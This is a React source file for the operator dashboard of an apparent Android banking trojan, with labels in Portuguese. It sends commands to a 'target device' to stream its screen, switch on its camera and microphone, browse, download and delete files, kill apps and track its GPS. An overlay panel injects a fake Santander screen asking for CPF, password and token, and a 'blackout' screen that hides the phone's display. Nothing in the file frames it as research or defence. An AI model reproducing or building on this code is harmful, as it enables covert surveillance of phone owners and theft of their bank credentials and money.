import { useState, useEffect } from "react";
import { Panel, PanelHeader } from "@/components/layout";
import { useSocket } from "@/hooks/use-socket";

const G = "#00ff88";
const DIM = "#1a3a20";

type Tool = "screen" | "camera" | "mic" | "files" | "apps" | "location" | "overlay";

interface Props {
  device: any;
  onBack: () => void;
}

function ToolBtn({ icon, label, active, onClick }: { icon: string; label: string; active: boolean; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      style={{
        background: active ? G : "#020e05",
        color: active ? "#000" : G,
        border: `1px solid ${active ? G : DIM}`,
        padding: "8px 6px",
        cursor: "pointer",
        fontFamily: "inherit",
        fontSize: 9,
        fontWeight: "bold",
        letterSpacing: "0.08em",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        gap: 4,
        flex: 1,
        transition: "all 0.1s",
        boxShadow: active ? `0 0 10px ${G}44` : "none",
      }}
    >
      <span style={{ fontSize: 18 }}>{icon}</span>
      {label}
    </button>
  );
}

function QualityBar({ value, onChange }: { value: number; onChange: (v: number) => void }) {
  return (
    <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
      <span style={{ fontSize: 8, color: "#445", letterSpacing: "0.08em" }}>QUALIDADE:</span>
      {[10, 20, 30, 70, 100].map((q) => (
        <button
          key={q}
          onClick={() => onChange(q)}
          style={{
            background: value === q ? G : "transparent",
            color: value === q ? "#000" : "#445",
            border: `1px solid ${value === q ? G : "#223"}`,
            fontSize: 8,
            padding: "1px 5px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
          }}
        >
          {q}%
        </button>
      ))}
    </div>
  );
}

// ── Live Screen ────────────────────────────────────────────────────
function LiveScreen({ device, socket }: { device: any; socket: any }) {
  const [quality, setQuality] = useState(30);
  const [streaming, setStreaming] = useState(false);
  const [frame, setFrame] = useState<string | null>(null);

  useEffect(() => {
    const handle = (data: { deviceId: number; frame: string }) => {
      if (data.deviceId === device.id) setFrame(data.frame);
    };
    socket.on("stream:frame", handle);
    return () => { socket.off("stream:frame", handle); };
  }, [socket, device.id]);

  const toggle = () => {
    if (!streaming) {
      socket.emit("command:send", { deviceId: device.id, command: `screen:start:${quality}` });
    } else {
      socket.emit("command:send", { deviceId: device.id, command: "screen:stop" });
      setFrame(null);
    }
    setStreaming(!streaming);
  };

  return (
    <div>
      <div style={{ display: "flex", gap: 10, alignItems: "center", marginBottom: 10 }}>
        <QualityBar value={quality} onChange={(q) => { setQuality(q); if (streaming) socket.emit("command:send", { deviceId: device.id, command: `screen:quality:${q}` }); }} />
        <button
          onClick={toggle}
          style={{
            background: streaming ? "#1a0000" : G,
            color: streaming ? "#ff4444" : "#000",
            border: `1px solid ${streaming ? "#ff4444" : G}`,
            fontSize: 9,
            padding: "3px 12px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
            letterSpacing: "0.1em",
          }}
        >
          {streaming ? "[ PARAR ]" : "[ INICIAR STREAM ]"}
        </button>
      </div>
      <div
        style={{
          width: "100%",
          aspectRatio: "9/16",
          maxHeight: 400,
          background: "#000",
          border: `1px solid ${streaming ? G : DIM}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          position: "relative",
          overflow: "hidden",
        }}
      >
        {frame ? (
          <img src={`data:image/jpeg;base64,${frame}`} alt="stream" style={{ width: "100%", height: "100%", objectFit: "contain" }} />
        ) : (
          <div style={{ color: "#334", fontSize: 10, textAlign: "center" }}>
            {streaming ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO FRAME...</> : "> STREAM INATIVO"}
          </div>
        )}
        {streaming && (
          <div style={{ position: "absolute", top: 6, right: 8, fontSize: 8, color: "#ff3333", display: "flex", alignItems: "center", gap: 4 }}>
            <span className="blink">●</span> AO VIVO
          </div>
        )}
      </div>
    </div>
  );
}

// ── Camera ────────────────────────────────────────────────────────
function CameraView({ device, socket }: { device: any; socket: any }) {
  const [camType, setCamType] = useState<"front" | "back">("front");
  const [active, setActive] = useState(false);
  const [frame, setFrame] = useState<string | null>(null);

  useEffect(() => {
    const handle = (data: { deviceId: number; frame: string }) => {
      if (data.deviceId === device.id) setFrame(data.frame);
    };
    socket.on("camera:frame", handle);
    return () => { socket.off("camera:frame", handle); };
  }, [socket, device.id]);

  const toggle = () => {
    if (!active) {
      socket.emit("command:send", { deviceId: device.id, command: `camera:start:${camType}` });
    } else {
      socket.emit("command:send", { deviceId: device.id, command: "camera:stop" });
      setFrame(null);
    }
    setActive(!active);
  };

  return (
    <div>
      <div style={{ display: "flex", gap: 8, marginBottom: 10, alignItems: "center" }}>
        {(["front", "back"] as const).map((c) => (
          <button
            key={c}
            onClick={() => { setCamType(c); if (active) socket.emit("command:send", { deviceId: device.id, command: `camera:switch:${c}` }); }}
            style={{
              background: camType === c ? G : "transparent",
              color: camType === c ? "#000" : "#445",
              border: `1px solid ${camType === c ? G : "#223"}`,
              fontSize: 9,
              padding: "3px 10px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontWeight: "bold",
            }}
          >
            {c === "front" ? "📷 FRONTAL" : "📷 TRASEIRA"}
          </button>
        ))}
        <button
          onClick={toggle}
          style={{
            background: active ? "#1a0000" : G,
            color: active ? "#ff4444" : "#000",
            border: `1px solid ${active ? "#ff4444" : G}`,
            fontSize: 9,
            padding: "3px 12px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
          }}
        >
          {active ? "[ PARAR ]" : "[ ATIVAR CÂMERA ]"}
        </button>
      </div>
      <div
        style={{
          width: "100%",
          aspectRatio: "4/3",
          background: "#000",
          border: `1px solid ${active ? G : DIM}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        {frame ? (
          <img src={`data:image/jpeg;base64,${frame}`} alt="camera" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
        ) : (
          <div style={{ color: "#334", fontSize: 10 }}>{active ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO...</> : "> CÂMERA INATIVA"}</div>
        )}
      </div>
    </div>
  );
}

// ── Microphone ───────────────────────────────────────────────────
function MicView({ device, socket }: { device: any; socket: any }) {
  const [active, setActive] = useState(false);
  const [bars] = useState(() => Array.from({ length: 20 }, () => Math.random()));

  const toggle = () => {
    socket.emit("command:send", { deviceId: device.id, command: active ? "mic:stop" : "mic:start" });
    setActive(!active);
  };

  return (
    <div style={{ textAlign: "center", padding: 20 }}>
      <div style={{ marginBottom: 20 }}>
        <div style={{ fontSize: 48, marginBottom: 12 }}>🎙️</div>
        <div style={{ fontSize: 12, color: active ? G : "#445", letterSpacing: "0.2em", marginBottom: 16 }}>
          {active ? "ESCUTA ATIVA" : "MICROFONE INATIVO"}
        </div>
        {active && (
          <div style={{ display: "flex", gap: 3, justifyContent: "center", alignItems: "flex-end", height: 40, marginBottom: 16 }}>
            {bars.map((_, i) => (
              <div
                key={i}
                className="mic-bar"
                style={{
                  width: 4,
                  background: G,
                  borderRadius: 2,
                  animation: `micPulse ${0.3 + Math.random() * 0.5}s ease-in-out infinite alternate`,
                  height: `${20 + Math.random() * 80}%`,
                  boxShadow: `0 0 6px ${G}`,
                }}
              />
            ))}
          </div>
        )}
      </div>
      <button
        onClick={toggle}
        style={{
          background: active ? "#1a0000" : G,
          color: active ? "#ff4444" : "#000",
          border: `2px solid ${active ? "#ff4444" : G}`,
          fontSize: 11,
          padding: "10px 24px",
          cursor: "pointer",
          fontFamily: "inherit",
          fontWeight: "bold",
          letterSpacing: "0.15em",
          boxShadow: active ? "none" : `0 0 15px ${G}44`,
        }}
      >
        {active ? "[ PARAR ESCUTA ]" : "[ INICIAR ESCUTA ]"}
      </button>
    </div>
  );
}

// ── Files ─────────────────────────────────────────────────────────
function FilesView({ device, socket }: { device: any; socket: any }) {
  const [path, setPath] = useState("/sdcard");
  const [files] = useState([
    { name: "DCIM", type: "dir", size: "" },
    { name: "Download", type: "dir", size: "" },
    { name: "WhatsApp", type: "dir", size: "" },
    { name: "Documents", type: "dir", size: "" },
    { name: "screenshot_001.png", type: "file", size: "2.1 MB" },
    { name: "recording.mp4", type: "file", size: "14.7 MB" },
    { name: "contacts_backup.vcf", type: "file", size: "48 KB" },
  ]);

  const browse = (name: string) => {
    setPath(`${path}/${name}`);
    socket.emit("command:send", { deviceId: device.id, command: `files:list:${path}/${name}` });
  };

  return (
    <div>
      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 10 }}>
        <button
          onClick={() => setPath(path.split("/").slice(0, -1).join("/") || "/")}
          style={{ background: "transparent", border: `1px solid ${DIM}`, color: G, fontSize: 9, padding: "3px 8px", cursor: "pointer", fontFamily: "inherit" }}
        >
          ◀ VOLTAR
        </button>
        <div style={{ flex: 1, background: "#020e05", border: `1px solid ${DIM}`, color: G, fontSize: 9, padding: "3px 8px" }}>
          {path}
        </div>
      </div>
      <div style={{ border: `1px solid ${DIM}`, background: "#010801" }}>
        {files.map((f) => (
          <div
            key={f.name}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "5px 10px",
              borderBottom: "1px solid #0a160c",
              cursor: f.type === "dir" ? "pointer" : "default",
              fontSize: 10,
            }}
            onMouseEnter={(e) => { e.currentTarget.style.background = "#051208"; }}
            onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}
            onDoubleClick={() => { if (f.type === "dir") browse(f.name); }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 14 }}>{f.type === "dir" ? "📁" : "📄"}</span>
              <span style={{ color: f.type === "dir" ? "#44aaff" : G }}>{f.name}</span>
              {f.size && <span style={{ color: "#445", fontSize: 8 }}>{f.size}</span>}
            </div>
            <div style={{ display: "flex", gap: 4 }}>
              {f.type === "file" && (
                <button
                  onClick={() => socket.emit("command:send", { deviceId: device.id, command: `files:download:${path}/${f.name}` })}
                  style={{ background: "transparent", border: `1px solid ${DIM}`, color: G, fontSize: 7, padding: "1px 5px", cursor: "pointer", fontFamily: "inherit" }}
                >
                  ↓ DL
                </button>
              )}
              <button
                onClick={() => socket.emit("command:send", { deviceId: device.id, command: `files:delete:${path}/${f.name}` })}
                style={{ background: "transparent", border: "1px solid #332", color: "#ff4444", fontSize: 7, padding: "1px 5px", cursor: "pointer", fontFamily: "inherit" }}
              >
                ✕ DEL
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Apps ──────────────────────────────────────────────────────────
function AppsView({ device, socket }: { device: any; socket: any }) {
  const apps = [
    { name: "WhatsApp", package: "com.whatsapp", running: true },
    { name: "Instagram", package: "com.instagram.android", running: false },
    { name: "Nubank", package: "com.nubank", running: true },
    { name: "Itaú", package: "com.itau", running: false },
    { name: "Google Chrome", package: "com.android.chrome", running: true },
    { name: "Câmera", package: "com.android.camera2", running: false },
    { name: "Mensagens", package: "com.google.android.apps.messaging", running: false },
    { name: "Configurações", package: "com.android.settings", running: true },
  ];

  return (
    <div>
      <div style={{ fontSize: 8, color: "#445", marginBottom: 8 }}>{apps.length} APPS INSTALADOS</div>
      <div style={{ border: `1px solid ${DIM}`, background: "#010801" }}>
        {apps.map((app) => (
          <div
            key={app.package}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "6px 10px",
              borderBottom: "1px solid #0a160c",
              fontSize: 10,
            }}
          >
            <div>
              <div style={{ color: G, fontWeight: "bold" }}>{app.name}</div>
              <div style={{ color: "#334", fontSize: 8 }}>{app.package}</div>
            </div>
            <div style={{ display: "flex", gap: 5, alignItems: "center" }}>
              {app.running && (
                <span style={{ fontSize: 7, color: G, border: `1px solid ${G}44`, padding: "1px 4px" }}>●ATIVO</span>
              )}
              <button
                onClick={() => socket.emit("command:send", { deviceId: device.id, command: `app:open:${app.package}` })}
                style={{ background: "transparent", border: `1px solid ${DIM}`, color: G, fontSize: 7, padding: "2px 6px", cursor: "pointer", fontFamily: "inherit" }}
              >
                ▶ ABRIR
              </button>
              {app.running && (
                <button
                  onClick={() => socket.emit("command:send", { deviceId: device.id, command: `app:kill:${app.package}` })}
                  style={{ background: "transparent", border: "1px solid #332", color: "#ff4444", fontSize: 7, padding: "2px 6px", cursor: "pointer", fontFamily: "inherit" }}
                >
                  ✕ MATAR
                </button>
              )}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Location ──────────────────────────────────────────────────────
function LocationView({ device, socket }: { device: any; socket: any }) {
  const [tracking, setTracking] = useState(false);
  const [coords, setCoords] = useState<{ lat: number; lng: number; acc: number } | null>(null);

  useEffect(() => {
    const handle = (data: { deviceId: number; lat: number; lng: number; accuracy: number }) => {
      if (data.deviceId === device.id) setCoords({ lat: data.lat, lng: data.lng, acc: data.accuracy });
    };
    socket.on("device:location", handle);
    return () => { socket.off("device:location", handle); };
  }, [socket, device.id]);

  const toggle = () => {
    socket.emit("command:send", { deviceId: device.id, command: tracking ? "location:stop" : "location:start" });
    setTracking(!tracking);
  };

  return (
    <div>
      <div style={{ display: "flex", gap: 10, marginBottom: 10, alignItems: "center" }}>
        <button
          onClick={toggle}
          style={{
            background: tracking ? "#1a0000" : G,
            color: tracking ? "#ff4444" : "#000",
            border: `1px solid ${tracking ? "#ff4444" : G}`,
            fontSize: 9,
            padding: "4px 14px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
          }}
        >
          {tracking ? "[ PARAR RASTREIO ]" : "[ INICIAR RASTREIO GPS ]"}
        </button>
        {coords && (
          <div style={{ fontSize: 9, color: G }}>
            📍 {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)} ±{coords.acc}m
          </div>
        )}
      </div>

      {/* Map placeholder */}
      <div
        style={{
          width: "100%",
          height: 300,
          background: "#010d03",
          border: `1px solid ${DIM}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          flexDirection: "column",
          gap: 12,
          position: "relative",
          overflow: "hidden",
        }}
      >
        {/* Grid lines */}
        {Array.from({ length: 8 }).map((_, i) => (
          <div key={`h${i}`} style={{ position: "absolute", top: `${i * 14.28}%`, left: 0, right: 0, height: 1, background: "#0a1a0c" }} />
        ))}
        {Array.from({ length: 8 }).map((_, i) => (
          <div key={`v${i}`} style={{ position: "absolute", left: `${i * 14.28}%`, top: 0, bottom: 0, width: 1, background: "#0a1a0c" }} />
        ))}

        {coords ? (
          <>
            <div style={{ fontSize: 32, zIndex: 1 }}>📍</div>
            <div style={{ color: G, fontSize: 10, zIndex: 1 }}>{coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}</div>
            <div style={{ color: "#445", fontSize: 8, zIndex: 1 }}>Precisão: ±{coords.acc}m</div>
            <a
              href={`https://maps.google.com/?q=${coords.lat},${coords.lng}`}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                color: G,
                fontSize: 9,
                border: `1px solid ${G}`,
                padding: "3px 10px",
                textDecoration: "none",
                zIndex: 1,
              }}
            >
              [ VER NO GOOGLE MAPS ]
            </a>
          </>
        ) : (
          <div style={{ color: "#334", fontSize: 10 }}>
            {tracking ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO SINAL GPS...</> : "> RASTREIO GPS INATIVO"}
          </div>
        )}
      </div>
    </div>
  );
}

// ── Overlay ──────────────────────────────────────────────────────
function OverlayView({ device, socket }: { device: any; socket: any }) {
  const send = (cmd: string) => socket.emit("command:send", { deviceId: device.id, command: cmd });

  return (
    <div>
      <div style={{ fontSize: 8, color: "#445", marginBottom: 12, letterSpacing: "0.08em" }}>
        SELECIONE O TEMPLATE DE OVERLAY PARA INJETAR NO DISPOSITIVO ALVO
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 10 }}>
        {/* Santander */}
        <button
          onClick={() => send("overlay:santander")}
          style={{
            background: "#0a0000",
            border: "2px solid #ec0000",
            color: "#ec0000",
            padding: "16px 10px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontSize: 10,
            fontWeight: "bold",
            letterSpacing: "0.12em",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: 6,
            transition: "all 0.15s",
          }}
          onMouseEnter={(e) => { e.currentTarget.style.boxShadow = "0 0 16px #ec000066"; }}
          onMouseLeave={(e) => { e.currentTarget.style.boxShadow = "none"; }}
        >
          <span style={{ fontSize: 24 }}>🏦</span>
          <span style={{ color: "#ec0000" }}>SANTANDER</span>
          <span style={{ fontSize: 7, color: "#664444" }}>Captura CPF + Senha + Token</span>
        </button>

        {/* Blackout */}
        <button
          onClick={() => send("overlay:blackout")}
          style={{
            background: "#050505",
            border: "2px solid #333",
            color: "#888",
            padding: "16px 10px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontSize: 10,
            fontWeight: "bold",
            letterSpacing: "0.12em",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            gap: 6,
            transition: "all 0.15s",
          }}
          onMouseEnter={(e) => { e.currentTarget.style.borderColor = "#555"; }}
          onMouseLeave={(e) => { e.currentTarget.style.borderColor = "#333"; }}
        >
          <span style={{ fontSize: 24 }}>⬛</span>
          <span>BLACKOUT MODE</span>
          <span style={{ fontSize: 7, color: "#445" }}>Tela preta total (#000000)</span>
        </button>

        {/* Remove overlay */}
        <button
          onClick={() => send("overlay:remove")}
          style={{
            background: "transparent",
            border: `1px solid ${DIM}`,
            color: "#445",
            padding: "10px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontSize: 9,
            letterSpacing: "0.1em",
            gridColumn: "span 2",
          }}
        >
          [ REMOVER OVERLAY ]
        </button>
      </div>

      {/* Santander preview */}
      <Panel style={{ borderColor: "#ec000044" }}>
        <PanelHeader>
          <span style={{ color: "#ec0000" }}>&gt; PREVIEW: SANTANDER OVERLAY</span>
        </PanelHeader>
        <div
          style={{
            background: "#ec0000",
            padding: 16,
            textAlign: "center",
          }}
        >
          <div style={{ color: "#fff", fontWeight: "bold", fontSize: 14, letterSpacing: "0.1em", marginBottom: 12 }}>
            🏦 Santander
          </div>
          <div style={{ color: "#ffcccc", fontSize: 9, marginBottom: 12 }}>
            Por segurança, confirme seus dados
          </div>
          {["CPF", "SENHA", "TOKEN"].map((field) => (
            <div key={field} style={{ marginBottom: 8 }}>
              <div style={{ fontSize: 7, color: "#ffaaaa", textAlign: "left", marginBottom: 2 }}>{field}</div>
              <div style={{ background: "#fff", height: 28, borderRadius: 4 }} />
            </div>
          ))}
          <div
            style={{
              background: "#8b0000",
              color: "#fff",
              padding: "8px",
              fontSize: 10,
              fontWeight: "bold",
              borderRadius: 4,
              marginTop: 8,
            }}
          >
            CONFIRMAR
          </div>
        </div>
      </Panel>
    </div>
  );
}

// ── Main DeviceTools ──────────────────────────────────────────────
export default function DeviceTools({ device, onBack }: Props) {
  const [activeTool, setActiveTool] = useState<Tool>("screen");
  const socket = useSocket();

  const tools: { id: Tool; icon: string; label: string }[] = [
    { id: "screen", icon: "🖥", label: "LIVE SCREEN" },
    { id: "camera", icon: "📷", label: "CÂMERA" },
    { id: "mic", icon: "🎙", label: "MICROFONE" },
    { id: "files", icon: "📁", label: "ARQUIVOS" },
    { id: "apps", icon: "📦", label: "APPS" },
    { id: "location", icon: "📍", label: "LOCALIZAÇÃO" },
    { id: "overlay", icon: "🎭", label: "OVERLAY" },
  ];

  return (
    <div>
      {/* Header */}
      <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 12, paddingBottom: 10, borderBottom: `1px solid #1a3a20` }}>
        <button
          onClick={onBack}
          style={{
            background: "transparent",
            border: `1px solid ${DIM}`,
            color: G,
            fontSize: 9,
            padding: "4px 10px",
            cursor: "pointer",
            fontFamily: "inherit",
            letterSpacing: "0.08em",
          }}
        >
          ◀ VOLTAR
        </button>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <span style={{ fontSize: 20 }}>📱</span>
          <div>
            <div style={{ fontSize: 12, fontWeight: "bold", color: G, letterSpacing: "0.15em" }}>
              {device.name}
            </div>
            <div style={{ fontSize: 8, color: "#445" }}>{device.model || "Android Device"} · {device.status?.toUpperCase()}</div>
          </div>
        </div>
        <div style={{ flex: 1 }} />
        <div style={{ display: "flex", gap: 6 }}>
          {device.hasRoot && <span style={{ fontSize: 8, padding: "2px 6px", border: "1px solid #ff8800", color: "#ff8800" }}>ROOT</span>}
          {device.gpsActive && <span style={{ fontSize: 8, padding: "2px 6px", border: `1px solid ${G}`, color: G }}>GPS</span>}
          {device.accessibilityOn && <span style={{ fontSize: 8, padding: "2px 6px", border: "1px solid #44aaff", color: "#44aaff" }}>ACC</span>}
        </div>
      </div>

      {/* Tool selector */}
      <div style={{ display: "flex", gap: 4, marginBottom: 12, flexWrap: "wrap" }}>
        {tools.map((t) => (
          <ToolBtn
            key={t.id}
            icon={t.icon}
            label={t.label}
            active={activeTool === t.id}
            onClick={() => setActiveTool(t.id)}
          />
        ))}
      </div>

      {/* Tool content */}
      <Panel>
        <PanelHeader>
          <span>&gt; {tools.find(t => t.id === activeTool)?.label}</span>
          <span style={{ color: "#445", fontSize: 8 }}>{device.name}</span>
        </PanelHeader>
        <div style={{ padding: 12 }}>
          {activeTool === "screen" && <LiveScreen device={device} socket={socket} />}
          {activeTool === "camera" && <CameraView device={device} socket={socket} />}
          {activeTool === "mic" && <MicView device={device} socket={socket} />}
          {activeTool === "files" && <FilesView device={device} socket={socket} />}
          {activeTool === "apps" && <AppsView device={device} socket={socket} />}
          {activeTool === "location" && <LocationView device={device} socket={socket} />}
          {activeTool === "overlay" && <OverlayView device={device} socket={socket} />}
        </div>
      </Panel>
    </div>
  );
}
